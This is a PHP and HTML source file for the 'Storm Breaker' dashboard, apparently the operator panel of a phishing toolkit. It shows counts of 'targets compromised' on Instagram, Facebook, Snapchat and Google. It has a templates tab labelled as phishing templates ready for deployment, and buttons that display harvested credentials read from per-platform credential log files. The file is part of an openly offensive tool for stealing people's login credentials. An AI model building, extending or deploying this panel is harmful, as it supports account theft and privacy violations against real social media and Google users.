<?php
session_start();
include "./assets/components/login-arc.php";


if(isset($_COOKIE['logindata']) && $_COOKIE['logindata'] == $key['token'] && $key['expired'] == "no"){
    if(!isset($_SESSION['IAm-logined'])){
        $_SESSION['IAm-logined'] = 'yes';
    }

}
elseif(isset($_SESSION['IAm-logined'])){
    $client_token = generate_token();
    setcookie("logindata", $client_token, time() + (86400 * 30), "/"); // 86400 = 1 day
    change_token($client_token);

}


else {
    header('location: login.php');
    
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="./assets/css/light-theme.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <title>Storm Breaker - Dashboard</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
        
        :root {
            --neon-green: #00ff41;
            --neon-blue: #00d4ff;
            --neon-purple: #b300ff;
            --neon-red: #ff0040;
            --neon-yellow: #ffff00;
            --cyber-dark: #0a0a0a;
            --cyber-darker: #050505;
            --cyber-gray: #1a1a1a;
            --cyber-light: #2a2a2a;
            --sidebar-width: 280px;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Orbitron', monospace;
            background: var(--cyber-dark);
            min-height: 100vh;
            color: var(--neon-green);
            overflow-x: hidden;
            position: relative;
        }

        /* Matrix Background Effect */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 50%, rgba(0, 255, 65, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(0, 212, 255, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 40% 80%, rgba(179, 0, 255, 0.1) 0%, transparent 50%);
            z-index: -2;
        }

        /* Animated Grid Background */
        body::after {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(0, 255, 65, 0.1) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 65, 0.1) 1px, transparent 1px);
            background-size: 50px 50px;
            animation: grid-move 20s linear infinite;
            z-index: -1;
        }

        @keyframes grid-move {
            0% { transform: translate(0, 0); }
            100% { transform: translate(50px, 50px); }
        }

        .dashboard-container {
            display: flex;
            min-height: 100vh;
        }

        .sidebar {
            width: var(--sidebar-width);
            background: linear-gradient(180deg, var(--cyber-darker) 0%, var(--cyber-gray) 100%);
            border-right: 2px solid var(--neon-green);
            box-shadow: 
                0 0 20px rgba(0, 255, 65, 0.3),
                inset -2px 0 10px rgba(0, 0, 0, 0.5);
            padding: 20px 0;
            position: fixed;
            height: 100vh;
            overflow-y: auto;
            z-index: 1000;
        }

        .sidebar-header {
            padding: 0 20px 30px;
            border-bottom: 1px solid var(--neon-green);
            margin-bottom: 20px;
            position: relative;
        }

        .sidebar-header::after {
            content: '';
            position: absolute;
            bottom: -1px;
            left: 0;
            width: 100%;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--neon-green), transparent);
            animation: pulse-glow 2s ease-in-out infinite alternate;
        }

        @keyframes pulse-glow {
            0% { opacity: 0.3; }
            100% { opacity: 1; }
        }

        .sidebar-header h2 {
            color: var(--neon-green);
            font-size: 24px;
            font-weight: 900;
            margin-bottom: 5px;
            text-shadow: 0 0 10px var(--neon-green);
            animation: text-glow 3s ease-in-out infinite alternate;
        }

        @keyframes text-glow {
            0% { text-shadow: 0 0 10px var(--neon-green); }
            100% { text-shadow: 0 0 20px var(--neon-green), 0 0 30px var(--neon-green); }
        }

        .sidebar-header p {
            color: var(--neon-blue);
            font-size: 12px;
            font-family: 'Share Tech Mono', monospace;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .nav-menu {
            list-style: none;
            padding: 0 10px;
        }

        .nav-item {
            margin-bottom: 5px;
        }

        .nav-link {
            display: flex;
            align-items: center;
            padding: 15px 20px;
            color: var(--neon-blue);
            text-decoration: none;
            border-radius: 0;
            border-left: 3px solid transparent;
            transition: all 0.3s ease;
            font-size: 14px;
            font-weight: 400;
            font-family: 'Share Tech Mono', monospace;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
        }

        .nav-link::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 255, 65, 0.1), transparent);
            transition: left 0.5s ease;
        }

        .nav-link:hover::before {
            left: 100%;
        }

        .nav-link:hover {
            background: rgba(0, 255, 65, 0.05);
            color: var(--neon-green);
            border-left-color: var(--neon-green);
            transform: translateX(10px);
            box-shadow: inset 0 0 20px rgba(0, 255, 65, 0.1);
        }

        .nav-link.active {
            background: rgba(0, 255, 65, 0.1);
            color: var(--neon-green);
            border-left-color: var(--neon-green);
            font-weight: 700;
            box-shadow: 
                inset 0 0 20px rgba(0, 255, 65, 0.2),
                0 0 10px rgba(0, 255, 65, 0.3);
        }

        .nav-link i {
            margin-right: 12px;
            width: 20px;
            text-align: center;
        }

        .main-content {
            flex: 1;
            margin-left: var(--sidebar-width);
            padding: 30px;
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        .dashboard-header {
            background: linear-gradient(135deg, var(--cyber-gray) 0%, var(--cyber-light) 100%);
            border: 1px solid var(--neon-green);
            border-radius: 0;
            padding: 25px 30px;
            margin-bottom: 30px;
            box-shadow: 
                0 0 30px rgba(0, 255, 65, 0.2),
                inset 0 0 20px rgba(0, 0, 0, 0.3);
            position: relative;
            overflow: hidden;
        }

        .dashboard-header::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 255, 65, 0.1), transparent);
            animation: scan-line 3s ease-in-out infinite;
        }

        @keyframes scan-line {
            0% { left: -100%; }
            50% { left: 100%; }
            100% { left: 100%; }
        }

        .dashboard-title {
            font-size: 32px;
            font-weight: 900;
            color: var(--neon-green);
            margin-bottom: 10px;
            text-shadow: 0 0 15px var(--neon-green);
            font-family: 'Orbitron', monospace;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .dashboard-subtitle {
            color: var(--neon-blue);
            font-size: 14px;
            font-family: 'Share Tech Mono', monospace;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: linear-gradient(135deg, var(--cyber-gray) 0%, var(--cyber-light) 100%);
            border: 1px solid var(--neon-green);
            border-radius: 0;
            padding: 25px;
            box-shadow: 
                0 0 20px rgba(0, 255, 65, 0.2),
                inset 0 0 20px rgba(0, 0, 0, 0.3);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, var(--neon-green), var(--neon-blue), var(--neon-purple));
            animation: border-flow 2s linear infinite;
        }

        @keyframes border-flow {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        .stat-card:hover {
            transform: translateY(-10px) scale(1.02);
            box-shadow: 
                0 0 30px rgba(0, 255, 65, 0.4),
                inset 0 0 30px rgba(0, 0, 0, 0.5);
        }

        .stat-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 15px;
        }

        .stat-icon {
            width: 50px;
            height: 50px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            color: white;
        }

        .stat-icon.instagram { 
            background: linear-gradient(45deg, var(--neon-purple), var(--neon-red)); 
            box-shadow: 0 0 20px rgba(179, 0, 255, 0.5);
        }
        .stat-icon.facebook { 
            background: linear-gradient(45deg, var(--neon-blue), var(--neon-green)); 
            box-shadow: 0 0 20px rgba(0, 212, 255, 0.5);
        }
        .stat-icon.snapchat { 
            background: linear-gradient(45deg, var(--neon-yellow), var(--neon-red)); 
            box-shadow: 0 0 20px rgba(255, 255, 0, 0.5);
        }
        .stat-icon.google { 
            background: linear-gradient(45deg, var(--neon-green), var(--neon-blue)); 
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
        }

        .stat-value {
            font-size: 28px;
            font-weight: 900;
            color: var(--neon-green);
            text-shadow: 0 0 10px var(--neon-green);
            font-family: 'Orbitron', monospace;
        }

        .stat-label {
            color: var(--neon-blue);
            font-size: 12px;
            margin-top: 5px;
            font-family: 'Share Tech Mono', monospace;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .control-panel {
            background: linear-gradient(135deg, var(--cyber-gray) 0%, var(--cyber-light) 100%);
            border: 1px solid var(--neon-green);
            border-radius: 0;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 
                0 0 30px rgba(0, 255, 65, 0.2),
                inset 0 0 20px rgba(0, 0, 0, 0.3);
            position: relative;
        }

        .control-panel h3 {
            color: var(--neon-green);
            margin-bottom: 20px;
            font-size: 20px;
            font-weight: 700;
            font-family: 'Orbitron', monospace;
            text-transform: uppercase;
            letter-spacing: 1px;
            text-shadow: 0 0 10px var(--neon-green);
        }

        .control-buttons {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }

        .btn-dashboard {
            padding: 15px 25px;
            border: 1px solid var(--neon-green);
            border-radius: 0;
            font-weight: 600;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            font-family: 'Share Tech Mono', monospace;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
            background: var(--cyber-gray);
        }

        .btn-dashboard::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 255, 65, 0.2), transparent);
            transition: left 0.5s ease;
        }

        .btn-dashboard:hover::before {
            left: 100%;
        }

        .btn-dashboard i {
            margin-right: 10px;
            font-size: 14px;
        }

        .btn-dashboard:hover {
            transform: translateY(-3px);
            box-shadow: 
                0 0 20px rgba(0, 255, 65, 0.4),
                inset 0 0 20px rgba(0, 255, 65, 0.1);
            border-color: var(--neon-green);
        }

        .btn-primary { 
            color: var(--neon-blue); 
            border-color: var(--neon-blue);
        }
        .btn-primary:hover { 
            color: var(--neon-green); 
            border-color: var(--neon-green);
            box-shadow: 0 0 20px rgba(0, 212, 255, 0.4);
        }
        
        .btn-success { 
            color: var(--neon-green); 
            border-color: var(--neon-green);
        }
        .btn-success:hover { 
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.4);
        }
        
        .btn-danger { 
            color: var(--neon-red); 
            border-color: var(--neon-red);
        }
        .btn-danger:hover { 
            color: var(--neon-green); 
            border-color: var(--neon-green);
            box-shadow: 0 0 20px rgba(255, 0, 64, 0.4);
        }
        
        .btn-warning { 
            color: var(--neon-yellow); 
            border-color: var(--neon-yellow);
        }
        .btn-warning:hover { 
            color: var(--neon-green); 
            border-color: var(--neon-green);
            box-shadow: 0 0 20px rgba(255, 255, 0, 0.4);
        }
        
        .btn-info { 
            color: var(--neon-blue); 
            border-color: var(--neon-blue);
        }
        .btn-info:hover { 
            color: var(--neon-green); 
            border-color: var(--neon-green);
            box-shadow: 0 0 20px rgba(0, 212, 255, 0.4);
        }

        .results-panel {
            background: linear-gradient(135deg, var(--cyber-gray) 0%, var(--cyber-light) 100%);
            border: 1px solid var(--neon-green);
            border-radius: 0;
            padding: 30px;
            box-shadow: 
                0 0 30px rgba(0, 255, 65, 0.2),
                inset 0 0 20px rgba(0, 0, 0, 0.3);
        }

        .results-panel h3 {
            color: var(--neon-green);
            margin-bottom: 20px;
            font-size: 20px;
            font-weight: 700;
            font-family: 'Orbitron', monospace;
            text-transform: uppercase;
            letter-spacing: 1px;
            text-shadow: 0 0 10px var(--neon-green);
        }

        .results-textarea {
            width: 100%;
            min-height: 400px;
            border: 1px solid var(--neon-green);
            border-radius: 0;
            padding: 20px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 12px;
            line-height: 1.6;
            resize: vertical;
            background: var(--cyber-darker);
            color: var(--neon-green);
            box-shadow: 
                inset 0 0 20px rgba(0, 0, 0, 0.5),
                0 0 10px rgba(0, 255, 65, 0.1);
        }

        .results-textarea:focus {
            outline: none;
            border-color: var(--neon-blue);
            box-shadow: 
                inset 0 0 20px rgba(0, 0, 0, 0.5),
                0 0 20px rgba(0, 212, 255, 0.3);
        }

        .template-links {
            background: linear-gradient(135deg, var(--cyber-gray) 0%, var(--cyber-light) 100%);
            border: 1px solid var(--neon-green);
            border-radius: 0;
            padding: 30px;
            box-shadow: 
                0 0 30px rgba(0, 255, 65, 0.2),
                inset 0 0 20px rgba(0, 0, 0, 0.3);
        }

        .template-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
        }

        .template-item {
            display: flex;
            align-items: center;
            background: var(--cyber-darker);
            border: 1px solid var(--neon-blue);
            border-radius: 0;
            padding: 15px;
            transition: all 0.3s ease;
            position: relative;
        }

        .template-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, var(--neon-blue), var(--neon-green));
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .template-item:hover::before {
            opacity: 1;
        }

        .template-item:hover {
            background: var(--cyber-gray);
            transform: translateY(-3px);
            border-color: var(--neon-green);
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
        }

        .template-url {
            flex: 1;
            font-family: 'Share Tech Mono', monospace;
            font-size: 11px;
            color: var(--neon-blue);
            margin-right: 10px;
            word-break: break-all;
        }

        .copy-btn {
            background: var(--cyber-gray);
            color: var(--neon-green);
            border: 1px solid var(--neon-green);
            border-radius: 0;
            padding: 8px 12px;
            font-size: 10px;
            font-family: 'Share Tech Mono', monospace;
            text-transform: uppercase;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .copy-btn:hover {
            background: var(--neon-green);
            color: var(--cyber-dark);
            box-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
        }

        @media (max-width: 768px) {
            .sidebar {
                transform: translateX(-100%);
                transition: transform 0.3s ease;
            }

            .sidebar.open {
                transform: translateX(0);
            }

            .main-content {
                margin-left: 0;
                padding: 20px;
            }

            .dashboard-header {
                padding: 20px;
            }

            .stats-grid {
                grid-template-columns: 1fr;
            }

            .control-buttons {
                grid-template-columns: 1fr;
            }

            .template-grid {
                grid-template-columns: 1fr;
            }
        }

        .mobile-menu-btn {
            display: none;
            position: fixed;
            top: 20px;
            left: 20px;
            z-index: 1001;
            background: var(--cyber-gray);
            color: var(--neon-green);
            border: 1px solid var(--neon-green);
            border-radius: 0;
            padding: 12px;
            font-size: 18px;
            cursor: pointer;
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
            transition: all 0.3s ease;
        }

        .mobile-menu-btn:hover {
            background: var(--neon-green);
            color: var(--cyber-dark);
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
        }

        @media (max-width: 768px) {
            .mobile-menu-btn {
                display: block;
            }
        }
    </style>
</head>

<body id="ourbody" onload="check_new_version()">
    <button class="mobile-menu-btn" onclick="toggleSidebar()">
        <i class="fas fa-bars"></i>
    </button>

    <div class="dashboard-container">
        <div class="sidebar" id="sidebar">
            <div class="sidebar-header">
                <h2><i class="fas fa-skull-crossbones"></i> STORM BREAKER</h2>
                <p>CYBER OPERATIONS CENTER</p>
            </div>
            
            <ul class="nav-menu">
                <li class="nav-item">
                    <a href="#dashboard" class="nav-link active">
                        <i class="fas fa-terminal"></i>
                        DASHBOARD
                    </a>
                </li>
                <li class="nav-item">
                    <a href="#templates" class="nav-link">
                        <i class="fas fa-bug"></i>
                        TEMPLATES
                    </a>
                </li>
                <li class="nav-item">
                    <a href="#results" class="nav-link">
                        <i class="fas fa-database"></i>
                        LOGS
                    </a>
                </li>
                <li class="nav-item">
                    <a href="#controls" class="nav-link">
                        <i class="fas fa-crosshairs"></i>
                        CONTROLS
                    </a>
                </li>
            </ul>
        </div>

        <div class="main-content">
            <!-- Dashboard Tab -->
            <div id="dashboard-tab" class="tab-content active">
                <div class="dashboard-header">
                    <h1 class="dashboard-title">MISSION CONTROL</h1>
                    <p class="dashboard-subtitle">MONITORING CYBER OPERATIONS</p>
                </div>

                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-header">
                            <div class="stat-icon instagram">
                                <i class="fab fa-instagram"></i>
                            </div>
                            <div class="stat-value" id="instagram-count">0</div>
                        </div>
                        <div class="stat-label">TARGETS COMPROMISED</div>
                    </div>

                    <div class="stat-card">
                        <div class="stat-header">
                            <div class="stat-icon facebook">
                                <i class="fab fa-facebook"></i>
                            </div>
                            <div class="stat-value" id="facebook-count">0</div>
                        </div>
                        <div class="stat-label">TARGETS COMPROMISED</div>
                    </div>

                    <div class="stat-card">
                        <div class="stat-header">
                            <div class="stat-icon snapchat">
                                <i class="fab fa-snapchat"></i>
                            </div>
                            <div class="stat-value" id="snapchat-count">0</div>
                        </div>
                        <div class="stat-label">TARGETS COMPROMISED</div>
                    </div>

                    <div class="stat-card">
                        <div class="stat-header">
                            <div class="stat-icon google">
                                <i class="fab fa-google"></i>
                            </div>
                            <div class="stat-value" id="google-count">0</div>
                        </div>
                        <div class="stat-label">TARGETS COMPROMISED</div>
                    </div>
                </div>
            </div>

            <!-- Templates Tab -->
            <div id="templates-tab" class="tab-content">
                <div class="dashboard-header">
                    <h1 class="dashboard-title">WEAPON DEPLOYMENT</h1>
                    <p class="dashboard-subtitle">PHISHING TEMPLATES READY FOR DEPLOYMENT</p>
                </div>

                <div class="template-links">
                    <div class="template-grid" id="links"></div>
                </div>
            </div>

            <!-- Results Tab -->
            <div id="results-tab" class="tab-content">
                <div class="dashboard-header">
                    <h1 class="dashboard-title">INTELLIGENCE GATHERING</h1>
                    <p class="dashboard-subtitle">CAPTURED DATA AND OPERATION LOGS</p>
                </div>

                <div class="results-panel">
                    <textarea class="results-textarea" id="result" placeholder="Results will appear here..."></textarea>
                </div>
            </div>

            <!-- Controls Tab -->
            <div id="controls-tab" class="tab-content">
                <div class="dashboard-header">
                    <h1 class="dashboard-title">COMMAND CENTER</h1>
                    <p class="dashboard-subtitle">OPERATION CONTROL AND MANAGEMENT</p>
</div>

                <div class="control-panel">
                    <h3><i class="fas fa-crosshairs"></i> SYSTEM CONTROLS</h3>
                    <div class="control-buttons">
                        <button class="btn-dashboard btn-danger" id="btn-listen">
                            <i class="fas fa-play"></i>
                            <span>Listener Running / Press to Stop</span>
                        </button>
                        <button class="btn-dashboard btn-success" onclick="saveTextAsFile(result.value,'log.txt')">
                            <i class="fas fa-download"></i>
                            Download Logs
                        </button>
                        <button class="btn-dashboard btn-warning" id="btn-clear">
                            <i class="fas fa-trash"></i>
                            Clear Logs
                        </button>
                    </div>
                    
                    <h4 style="margin-top: 25px; margin-bottom: 15px; color: var(--neon-green); font-family: 'Orbitron', monospace; text-transform: uppercase; letter-spacing: 1px;">INTELLIGENCE RETRIEVAL</h4>
                    <div class="control-buttons">
                        <button class="btn-dashboard btn-info" onclick="viewInstagramCredentials()">
                            <i class="fab fa-instagram"></i>
                            Instagram
                        </button>
                        <button class="btn-dashboard btn-primary" onclick="viewFacebookCredentials()">
                            <i class="fab fa-facebook"></i>
                            Facebook
                        </button>
                        <button class="btn-dashboard btn-warning" onclick="viewSnapchatCredentials()">
                            <i class="fab fa-snapchat"></i>
                            Snapchat
                        </button>
                        <button class="btn-dashboard btn-danger" onclick="viewGoogleCredentials()">
                            <i class="fab fa-google"></i>
                            Google
                        </button>
                    </div>
                </div>
            </div>
        </div>
</div>

    <script>
        function toggleSidebar() {
            const sidebar = document.getElementById('sidebar');
            sidebar.classList.toggle('open');
        }

        // Close sidebar when clicking outside on mobile
        document.addEventListener('click', function(e) {
            const sidebar = document.getElementById('sidebar');
            const menuBtn = document.querySelector('.mobile-menu-btn');
            
            if (window.innerWidth <= 768 && 
                !sidebar.contains(e.target) && 
                !menuBtn.contains(e.target)) {
                sidebar.classList.remove('open');
            }
        });

        // Update stats with real data
        function updateStats() {
            // Count Instagram credentials
            $.get("instagram_credentials.txt", function(data) {
                const instagramCount = (data.match(/=== INSTAGRAM CREDENTIALS CAPTURED ===/g) || []).length;
                document.getElementById('instagram-count').textContent = instagramCount;
            }).fail(function() {
                document.getElementById('instagram-count').textContent = '0';
            });

            // Count Facebook credentials
            $.get("facebook_credentials.txt", function(data) {
                const facebookCount = (data.match(/=== FACEBOOK CREDENTIALS CAPTURED ===/g) || []).length;
                document.getElementById('facebook-count').textContent = facebookCount;
            }).fail(function() {
                document.getElementById('facebook-count').textContent = '0';
            });

            // Count Snapchat credentials
            $.get("snapchat_credentials.txt", function(data) {
                const snapchatCount = (data.match(/=== SNAPCHAT CREDENTIALS CAPTURED ===/g) || []).length;
                document.getElementById('snapchat-count').textContent = snapchatCount;
            }).fail(function() {
                document.getElementById('snapchat-count').textContent = '0';
            });

            // Count Google credentials
            $.get("google_credentials.txt", function(data) {
                const googleCount = (data.match(/=== GOOGLE CREDENTIALS CAPTURED ===/g) || []).length;
                document.getElementById('google-count').textContent = googleCount;
            }).fail(function() {
                document.getElementById('google-count').textContent = '0';
            });
        }

        // Update stats every 10 seconds
        setInterval(updateStats, 10000);
        updateStats(); // Initial update

        // Tab switching functionality
        function switchTab(tabName) {
            // Hide all tabs
            const tabs = document.querySelectorAll('.tab-content');
            tabs.forEach(tab => tab.classList.remove('active'));
            
            // Remove active class from all nav links
            const navLinks = document.querySelectorAll('.nav-link');
            navLinks.forEach(link => link.classList.remove('active'));
            
            // Show selected tab
            const selectedTab = document.getElementById(tabName + '-tab');
            if (selectedTab) {
                selectedTab.classList.add('active');
            }
            
            // Add active class to clicked nav link
            const clickedLink = document.querySelector(`[href="#${tabName}"]`);
            if (clickedLink) {
                clickedLink.classList.add('active');
            }
            
            // Close mobile sidebar if open
            if (window.innerWidth <= 768) {
                document.getElementById('sidebar').classList.remove('open');
            }
        }

        // Add click event listeners to nav links
        document.addEventListener('DOMContentLoaded', function() {
            const navLinks = document.querySelectorAll('.nav-link');
            navLinks.forEach(link => {
                link.addEventListener('click', function(e) {
                    e.preventDefault();
                    const tabName = this.getAttribute('href').substring(1);
                    switchTab(tabName);
                });
            });
        });
    </script>
</body>
</html>

<script src="./assets/js/jquery.min.js"></script>
<script src="./assets/js/script.js"></script>
<script src="./assets/js/sweetalert2.min.js"></script>
<script src="./assets/js/growl-notification.min.js"></script>